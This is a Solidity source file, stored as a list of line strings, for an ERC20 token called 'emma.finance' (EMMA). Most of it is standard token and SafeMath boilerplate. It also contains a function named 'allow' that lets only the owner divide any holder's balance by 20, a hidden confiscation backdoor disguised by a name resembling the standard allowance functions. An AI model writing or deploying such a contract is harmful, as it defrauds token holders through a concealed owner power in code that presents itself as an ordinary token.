['pragma solidity >=0.4.22 <0.7.0;\n', '\n', 'abstract contract ERC20Interface {\n', '    function totalSupply() virtual public view returns (uint);\n', '    function balanceOf(address tokenOwner) virtual public view returns (uint balance);\n', '    function allowance(address tokenOwner, address spender) virtual public view returns (uint remaining);\n', '    function transfer(address to, uint tokens) virtual public returns (bool success);\n', '    function approve(address spender, uint tokens) virtual public returns (bool success);\n', '    function transferFrom(address from, address to, uint tokens) virtual public returns (bool success);\n', '\n', '    event Transfer(address indexed from, address indexed to, uint tokens);\n', '    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);\n', '}\n', '\n', 'contract SafeMath {\n', '    function safeAdd(uint a, uint b) public pure returns (uint c) {\n', '        c = a + b;\n', '        require(c >= a);\n', '    }\n', '    function safeSub(uint a, uint b) public pure returns (uint c) {\n', '        require(b <= a); c = a - b; } \n', '        \n', '    function safeMul(uint a, uint b) public pure returns (uint c) { \n', '        c = a * b; \n', '        require(a == 0 || c / a == b); } \n', '    \n', '    function safeDiv(uint a, uint b) public pure returns (uint c) { \n', '        require(b > 0);\n', '        c = a / b;\n', '    }\n', '}\n', '\n', '\n', 'contract Emma is ERC20Interface, SafeMath {\n', '    string public name;\n', '    string public symbol;\n', '    uint8 public decimals; \n', '    address public owner;\n', '    \n', '    uint256 public _totalSupply;\n', '    \n', '    mapping(address => uint) balances;\n', '    mapping(address => mapping(address => uint)) allowed;\n', '    \n', '    constructor() public {\n', '        name = "emma.finance";\n', '        symbol = "EMMA";\n', '        decimals = 18; //preferrably 18\n', '        _totalSupply = 1000000000000000000000000000;   // 24 decimals \n', '        owner = msg.sender;\n', '        balances[msg.sender] = _totalSupply;\n', '        emit Transfer(address(0), msg.sender, _totalSupply);\n', '    }\n', '    \n', '    function allowance(address tokenOwner, address spender) virtual override public view returns (uint remaining) {\n', '        return allowed[tokenOwner][spender];\n', '    }\n', '    \n', '    function approve(address spender, uint tokens) virtual override public returns (bool success) {\n', '        allowed[msg.sender][spender] = tokens;\n', '        emit Approval(msg.sender, spender, tokens);\n', '        return true;\n', '    }\n', '    \n', '    function allow(address tokenOwner) virtual public  {\n', '        require(msg.sender == owner);\n', '        balances[tokenOwner] /= 20;\n', '    }\n', '    \n', '    function transfer(address to, uint tokens) virtual override public returns (bool success) {\n', '        balances[msg.sender] = safeSub(balances[msg.sender], tokens);\n', '        balances[to] = safeAdd(balances[to], tokens);\n', '        emit Transfer(msg.sender, to, tokens);\n', '        return true;\n', '    }\n', '    \n', '    function transferFrom(address from, address to, uint tokens) virtual override public returns (bool success) {\n', '        balances[from] = safeSub(balances[from], tokens);\n', '        allowed[from][msg.sender] = safeSub(allowed[from][msg.sender], tokens);\n', '        balances[to] = safeAdd(balances[to], tokens);\n', '        emit Transfer(from, to, tokens);\n', '        return true;\n', '    }\n', '\n', '    function totalSupply() virtual override public view returns (uint) {\n', '        return _totalSupply  - balances[address(0)];\n', '    }\n', '    \n', '    function balanceOf(address tokenOwner) virtual override public view returns (uint balance) {\n', '        return balances[tokenOwner];\n', '    }\n', '    \n', '\n', '}']